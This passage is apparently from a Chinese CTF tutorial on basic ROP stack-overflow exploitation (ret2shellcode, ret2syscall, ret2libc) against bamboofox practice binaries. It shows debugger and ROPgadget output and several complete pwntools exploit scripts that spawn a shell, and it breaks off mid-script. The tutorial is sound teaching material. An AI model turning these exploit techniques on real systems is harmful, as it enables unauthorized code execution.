.bss:0804A080 ; char buf2[100]&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;gef➤  b main
Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.
gef➤  r
Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 

Breakpoint 1, main () at ret2shellcode.c:8
8       setvbuf(stdout, 0LL, 2, 0LL);
─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]────
      6  int main(void)
      7  {
 →    8      setvbuf(stdout, 0LL, 2, 0LL);
      9      setvbuf(stdin, 0LL, 1, 0LL);
     10  
─────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x8048536 → Name: main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  vmmap 
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so
0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so
0xf7faf000 0xf7fb2000 0x00000000 rwx 
0xf7fd3000 0xf7fd5000 0x00000000 rwx 
0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]
0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]
0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffb000 0xf7ffc000 0x00000000 rwx 
0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 0x00000000 rwx [stack]&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。&lt;/p&gt;
&lt;p&gt;具体的 payload 如下&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;#!/usr/bin/env python
from pwn import *

sh = process(&#39;./ret2shellcode&#39;)
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

sh.sendline(shellcode.ljust(112, &#39;A&#39;) + p32(buf2_addr))
sh.interactive()&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;题目-¶&#34;&gt;&lt;a href=&#34;#题目-¶&#34; class=&#34;headerlink&#34; title=&#34;题目 ¶&#34;&gt;&lt;/a&gt;题目 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI181&#34;&gt;¶&lt;/span&gt;&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;sniperoj-pwn100-shellcode-x86-64&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ret2syscall¶&#34;&gt;&lt;a href=&#34;#ret2syscall¶&#34; class=&#34;headerlink&#34; title=&#34;ret2syscall¶&#34;&gt;&lt;/a&gt;ret2syscall&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI3JldDJzeXNjYWxs&#34;&gt;¶&lt;/span&gt;&lt;/h2&gt;&lt;h3 id=&#34;原理-¶-2&#34;&gt;&lt;a href=&#34;#原理-¶-2&#34; class=&#34;headerlink&#34; title=&#34;原理 ¶&#34;&gt;&lt;/a&gt;原理 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI182&#34;&gt;¶&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;ret2syscall，即控制程序执行系统调用，获取 shell。&lt;/p&gt;
&lt;h3 id=&#34;例子-¶-2&#34;&gt;&lt;a href=&#34;#例子-¶-2&#34; class=&#34;headerlink&#34; title=&#34;例子 ¶&#34;&gt;&lt;/a&gt;例子 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI183&#34;&gt;¶&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;这里我们以 bamboofox 中的 ret2syscall 为例&lt;/p&gt;
&lt;p&gt;点击下载: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MnN5c2NhbGwvYmFtYm9vZm94LXJldDJzeXNjYWxsL3JvcA==&#34;&gt;ret2syscall&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;首先检测程序开启的保护&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;➜  ret2syscall checksec rop
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看出，源程序为 32 位，开启了 NX 保护。接下来利用 IDA 来查看源码&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts(&#34;This time, no system() and NO SHELLCODE!!!&#34;);
  puts(&#34;What do you plan to do?&#34;);
  gets(&amp;amp;v4);
  return 0;
}&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。关于系统调用的知识，请参考&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU3JUIzJUJCJUU3JUJCJTlGJUU4JUIwJTgzJUU3JTk0JUE4&#34;&gt;https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;execve(&#34;/bin/sh&#34;,NULL,NULL)&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;其中，该程序是 32 位，所以我们需要使得&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;系统调用号，即 eax 应该为 0xb&lt;/li&gt;
&lt;li&gt;第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。&lt;/li&gt;
&lt;li&gt;第二个参数，即 ecx 应该为 0&lt;/li&gt;
&lt;li&gt;第三个参数，即 edx 应该为 0&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。&lt;/p&gt;
&lt;p&gt;首先，我们来寻找控制 eax 的 gadgets&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;➜  ret2syscall ROPgadget --binary rop  --only &#39;pop|ret&#39; | grep &#39;eax&#39;
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。&lt;/p&gt;
&lt;p&gt;类似的，我们可以得到控制其它寄存器的 gadgets&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;➜  ret2syscall ROPgadget --binary rop  --only &#39;pop|ret&#39; | grep &#39;ebx&#39;
0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080be23f : pop ebx ; pop edi ; ret
0x0806eb69 : pop ebx ; pop edx ; ret
0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08048913 : pop ebx ; pop esi ; pop edi ; ret
0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
0x08049a94 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d7d3c : pop ebx ; ret 0x6f9
0x08099c87 : pop ebx ; ret 8
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0806336b : pop edi ; pop esi ; pop ebx ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
0x0805c820 : pop esi ; pop ebx ; ret
0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0807b6ed : pop ss ; pop ebx ; ret&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这里，我选择&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个可以直接控制其它三个寄存器。&lt;/p&gt;
&lt;p&gt;此外，我们需要获得 /bin/sh 字符串对应的地址。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;➜  ret2syscall ROPgadget --binary rop  --string &#39;/bin/sh&#39; 
Strings information
============================================================
0x080be408 : /bin/sh&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以找到对应的地址，此外，还有 int 0x80 的地址，如下&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;➜  ret2syscall ROPgadget --binary rop  --only &#39;int&#39;                 
Gadgets information
============================================================
0x08049421 : int 0x80
0x080938fe : int 0xbb
0x080869b5 : int 0xf6
0x0807b4d4 : int 0xfc

Unique gadgets found: 4&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;同时，也找到对应的地址了。&lt;/p&gt;
&lt;p&gt;下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;#!/usr/bin/env python
from pwn import *

sh = process(&#39;./rop&#39;)

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(
    [&#39;A&#39; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
sh.sendline(payload)
sh.interactive()&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;题目-¶-1&#34;&gt;&lt;a href=&#34;#题目-¶-1&#34; class=&#34;headerlink&#34; title=&#34;题目 ¶&#34;&gt;&lt;/a&gt;题目 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI184&#34;&gt;¶&lt;/span&gt;&lt;/h3&gt;&lt;h2 id=&#34;ret2libc¶&#34;&gt;&lt;a href=&#34;#ret2libc¶&#34; class=&#34;headerlink&#34; title=&#34;ret2libc¶&#34;&gt;&lt;/a&gt;ret2libc&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI3JldDJsaWJj&#34;&gt;¶&lt;/span&gt;&lt;/h2&gt;&lt;h3 id=&#34;原理-¶-3&#34;&gt;&lt;a href=&#34;#原理-¶-3&#34; class=&#34;headerlink&#34; title=&#34;原理 ¶&#34;&gt;&lt;/a&gt;原理 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI185&#34;&gt;¶&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。&lt;/p&gt;
&lt;h3 id=&#34;例子-¶-3&#34;&gt;&lt;a href=&#34;#例子-¶-3&#34; class=&#34;headerlink&#34; title=&#34;例子 ¶&#34;&gt;&lt;/a&gt;例子 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI18xMA==&#34;&gt;¶&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;我们由简单到难分别给出三个例子。&lt;/p&gt;
&lt;h4 id=&#34;例-1¶&#34;&gt;&lt;a href=&#34;#例-1¶&#34; class=&#34;headerlink&#34; title=&#34;例 1¶&#34;&gt;&lt;/a&gt;例 1&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvIzE=&#34;&gt;¶&lt;/span&gt;&lt;/h4&gt;&lt;p&gt;这里我们以 bamboofox 中 ret2libc1 为例&lt;/p&gt;
&lt;p&gt;点击下载: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MmxpYmMvcmV0MmxpYmMxL3JldDJsaWJjMQ==&#34;&gt;ret2libc1&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;首先，我们可以检查一下程序的安全保护&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;➜  ret2libc1 checksec ret2libc1    
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts(&#34;RET2LIBC &amp;gt;_&amp;lt;&#34;);
  gets((char *)&amp;amp;v4);
  return 0;
}&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 /bin/sh 存在&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;➜  ret2libc1 ROPgadget --binary ret2libc1 --string &#39;/bin/sh&#39;          
Strings information
============================================================
0x08048720 : /bin/sh&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;那么，我们直接返回该处，即执行 system 函数。相应的 payload 如下&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;#!/usr/bin/env python
from pwn import *

sh = process(&#39;./ret2libc1&#39;)

binsh_addr = 0x8048720
system_plt = 0x08048460
payload = flat([&#39;a&#39; * 112, system_plt, &#39;b&#39; * 4, binsh_addr])
sh.sendline(payload)

sh.interactive()&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。&lt;/p&gt;
&lt;p&gt;这个例子相对来说简单，同时提供了 system 地址与 /bin/sh 的地址，但是大多数程序并不会有这么好的情况。&lt;/p&gt;
&lt;h4 id=&#34;例-2¶&#34;&gt;&lt;a href=&#34;#例-2¶&#34; class=&#34;headerlink&#34; title=&#34;例 2¶&#34;&gt;&lt;/a&gt;例 2&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvIzI=&#34;&gt;¶&lt;/span&gt;&lt;/h4&gt;&lt;p&gt;这里以 bamboofox 中的 ret2libc2 为例&lt;/p&gt;
&lt;p&gt;点击下载: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MmxpYmMvcmV0MmxpYmMyL3JldDJsaWJjMg==&#34;&gt;ret2libc2&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;该题目与例 1 基本一致，只不过不再出现 /bin/sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“/bin/sh”)。由于漏洞与上述一致，这里就不在多说，具体的 exp 如下&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;##!/usr/bin/env python
from pwn import *

sh = process(&#39;./ret2libc2&#39;)

gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx = 0x0804843d
buf2 = 0x804a080
payload = flat(
    [&#39;a&#39; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
sh.sendline(payload)
sh.sendline(&#39;/bin/sh&#39;)
